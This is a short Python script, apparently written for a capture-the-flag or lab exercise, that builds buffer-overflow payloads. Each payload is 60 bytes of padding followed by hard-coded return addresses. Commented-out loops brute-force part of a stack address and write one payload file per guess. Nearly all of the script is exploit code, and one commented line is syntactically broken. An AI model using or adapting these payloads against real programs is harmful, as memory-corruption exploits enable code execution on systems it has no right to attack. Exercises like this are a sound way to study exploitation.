import struct
payload = "A" * 60 + "\x78\xce\xff\xff" + "\x70\xef\x04\x08" + "\xbd\xd1\xff\xff" + "\x68\xb7\x0b\x08" + "\x70\xe4\x04\x08"
a = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']

el_list = open("el_list2.txt", "w")

ar = [1 for i in range(60)]
ar=ar + [120,206,255,255]
ar = ar+[112,239,4,8]
ar = bytearray(ar)
print(ar)




# for i in range(4294955264, 4294955520):
# 	payload = "A" * 60 + "\x78\xce\xff\xff" + "\x70\xef\x04\x08" + '\\x' + '\\x'.join(x.encode('hex') for x in struct.pack('<Q', i)[:4]) + "\x68\xb7\x0b\x08"
# 	f = open("./els/el"+str(i), "w")
# 	el_list.write("el"+str(i)+"\n")
# 	f.write(payload)
# 	f.close()

# el_list.close()


# for i in a[13:15]:
# 	for j in a:
# 		for k in a:
# 			for l in a:
# 				t1 = f"{k}{l}"
# 				t2 = f"{i}{j}"
# 				payload = "A" * 60 + "\x78\xce\xff\xff" + "\x70\xef\x04\x08" + "\x"+t1 +"\x" t2\xff\xff" + "\x68\xb7\x0b\x08" + "\x70\xe4\x04\x08"
# 				f = open(f"./els/el{k}{l}{i}{j}", "w")
# 				el_list.write(f"el{k}{l}{i}{j}\n")
# 				f.write(payload)
# 				f.close()
		
			
        
        
#payload = "A" * 60 + "\x78\xce\xff\xff" + "\x70\xef\x04\x08" + """/x""" + f"{i}{j}\xd1\xff\xff" + "\x68\xb7\x0b\x08" + "\x70\xe4\x04\x08"
#f = open(f"./els/el{i}{j}", "w")
#f.write(payload)
#f.close()
